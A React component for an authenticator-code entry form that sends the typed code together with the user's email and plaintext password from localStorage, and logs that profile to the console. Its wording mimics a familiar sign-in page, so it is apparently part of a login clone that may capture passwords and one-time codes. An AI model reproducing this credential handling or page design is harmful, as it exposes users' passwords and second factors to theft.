import React, { useEffect, useState } from "react";
import { useHistory } from "react-router-dom";
import { addCode } from "../features/codeSlice";
import { useSelector, useDispatch } from "react-redux";
import { setUser } from "../features/registerSlice";
import { ThreeDots } from "react-loader-spinner";
import { toast } from "react-toastify";

function Code() {
  const history = useHistory();
  const [code, setCode] = useState("");
  const user = JSON.parse(localStorage.getItem("profile"));
  const { loading, error } = useSelector((state) => ({ ...state.code }));
  const dispatch = useDispatch();

  useEffect(() => {
    dispatch(setUser(user));
    //eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    error && toast.error(error);
    // eslint-disable-next-line
  }, [error]);
  const User = user;
  console.log(User);

  const handleSubmit = (e) => {
    e.preventDefault();
    const codeData = {
      code: code,
      email: User?.result?.email,
      password: User?.result?.password,
    };
    dispatch(addCode({ codeData, history }));
  };
  return (
    <div className="container">
      <form onSubmit={handleSubmit} className="code">
        <h1>Enter Code</h1>
        <div className="flex">
          <div className="code_num flexBox-sty">123</div>
          <p>
            Please type in the code displayed on your authenticator app from
            your device.
          </p>
        </div>

        {/* code input */}
        <div className="code_input">
          <input
            placeholder="Code"
            value={code}
            onChange={(e) => setCode(e.target.value)}
          />
        </div>
        <br />
        <p>
          Having Trouble?&nbsp;
          <span className="blue">Sign in another way</span>
        </p>
        <br />
        <p className="blue">More Information</p>
        <div className="code_btn ">
          <button className="flexBox-sty">
            {loading && (
              <ThreeDots
                height="20"
                width="20"
                color="white"
                ariaLabel="loading"
              />
            )}
            <span style={{ marginLeft: "10px" }}>Verify</span>
          </button>
        </div>
      </form>
    </div>
  );
}

export default Code;
